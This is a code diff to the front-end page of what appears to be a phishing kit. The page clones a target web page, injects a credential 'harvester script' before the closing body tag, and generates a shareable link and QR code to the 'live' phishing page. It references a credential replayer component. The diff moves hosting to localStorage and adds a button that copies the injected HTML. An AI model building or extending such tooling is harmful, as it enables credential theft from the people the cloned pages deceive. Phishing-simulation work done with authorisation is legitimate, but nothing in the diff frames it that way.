@@ -23,7 +23,6 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@
 import { Dialog, DialogTrigger, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from '@/components/ui/dialog';
 import { Separator } from '@/components/ui/separator';
 import { CredentialReplayer } from '@/components/credential-replayer';
-import { hostTestPage } from '@/actions/host-test-page-action';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -226,7 +225,7 @@ export default function PhishingPage() {
 
       // Inject harvester script
       if (html.includes('</body>')) {
-          html = html.replace(/<\/body>/i, \`\${harvesterScript}</body>\`);
+          html = html.replace(/<\/body>/i, \`${harvesterScript}</body>\`);
       } else {
           html += harvesterScript;
       }
@@ -244,17 +243,15 @@ export default function PhishingPage() {
   const handleGenerateLink = async () => {
     if (!modifiedHtml) return;
     setIsHosting(true);
-    setHostedUrl(null);
     
     try {
-      toast({ title: "Hosting Page...", description: "Writing file to public directory on the server." });
-      const { url: relativeUrl } = await hostTestPage(modifiedHtml);
+        const pageId = crypto.randomUUID();
+        const pageStorageKey = \`phishing-html-\${pageId}\`;
+        localStorage.setItem(pageStorageKey, modifiedHtml);
 
-      if (relativeUrl) {
-        // Construct the full absolute URL
-        const absoluteUrl = \`\${window.location.origin}\${relativeUrl}\`;
-        setHostedUrl(absoluteUrl);
-        toast({ title: "Public Link Generated!", description: "Your phishing page is now live." });
+        const finalUrl = \`\${window.location.origin}/phish/\${pageId}\`;
+        setHostedUrl(finalUrl);
+        toast({ title: "Local Link Generated!", description: "Your phishing page is now accessible." });
 
         const urlToClone = form.getValues('urlToClone');
         logActivity({
@@ -262,9 +259,6 @@ export default function PhishingPage() {
             action: 'Generated Phishing Link',
             details: \`Source: \${urlToClone || 'Pasted HTML'}\`,
         });
-      } else {
-         throw new Error("Hosting action did not return a URL.");
-      }
     } catch(err) {
         const error = err instanceof Error ? err.message : "An unknown error occurred";
         toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
@@ -277,6 +271,13 @@ export default function PhishingPage() {
     if (hostedUrl) {
       navigator.clipboard.writeText(hostedUrl);
       toast({ title: 'Copied!', description: 'Hosted URL copied to clipboard.' });
+    }
+  };
+  
+  const handleCopyHtml = () => {
+    if (modifiedHtml) {
+      navigator.clipboard.writeText(modifiedHtml);
+      toast({ title: 'Copied!', description: 'Injected HTML copied to clipboard.' });
     }
   };
   
@@ -331,7 +332,7 @@ export default function PhishingPage() {
         <div className="flex flex-col gap-6">
             <Card>
                 <CardHeader>
-                <CardTitle>1. Page Cloner</CardTitle>
+                <CardTitle>Page Cloner & Harvester Setup</CardTitle>
                 <CardDescription>Clone a page from a URL or paste HTML to inject the harvester script.</CardDescription>
                 </CardHeader>
                 <Form {...form}>
@@ -393,11 +394,11 @@ export default function PhishingPage() {
                     </CardContent>
                     {modifiedHtml && (
                     <CardFooter className="flex-col items-start gap-4">
-                        <CardTitle className="text-xl">2. Generate Public Link</CardTitle>
+                        <CardTitle className="text-xl">Generate Link</CardTitle>
                         <div className="w-full flex gap-2">
                             <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                                 {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
-                                Generate Public Link
+                                Generate Local Link
                             </Button>
                              <Dialog open={isSaveModalOpen} onOpenChange={setIsSaveModalOpen}>
                                 <DialogTrigger asChild>
@@ -428,22 +429,23 @@ export default function PhishingPage() {
             </Card>
           
           {hostedUrl && (
-             <div className="grid md:grid-cols-2 gap-4">
-                <Card>
-                    <CardHeader>
-                        <CardTitle>Hosted Page URL</CardTitle>
-                    </CardHeader>
-                    <CardContent>
-                        <div className="flex w-full items-center gap-2">
-                            <Input readOnly value={hostedUrl} className="font-mono" />
-                            <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
-                                <Clipboard className="h-4 w-4" />
-                            </Button>
-                        </div>
-                    </CardContent>
-                </Card>
-                <QrCodeGenerator url={hostedUrl} />
-             </div>
+             <Card>
+               <CardHeader>
+                 <CardTitle>Hosted Page URL</CardTitle>
+                 <CardDescription>Your phishing page is live. Use the URL or QR code below.</CardDescription>
+               </CardHeader>
+               <CardContent className="space-y-4">
+                 <div className="flex w-full items-center gap-2">
+                   <Input readOnly value={hostedUrl} className="font-mono" />
+                   <Button type="button" size="icon" variant="outline" onClick={handleCopyUrl}>
+                     <Clipboard className="h-4 w-4" />
+                   </Button>
+                 </div>
+                 <div className="flex justify-center">
+                   <QrCodeGenerator url={hostedUrl} />
+                 </div>
+               </CardContent>
+             </Card>
            )}
 
             <Card>
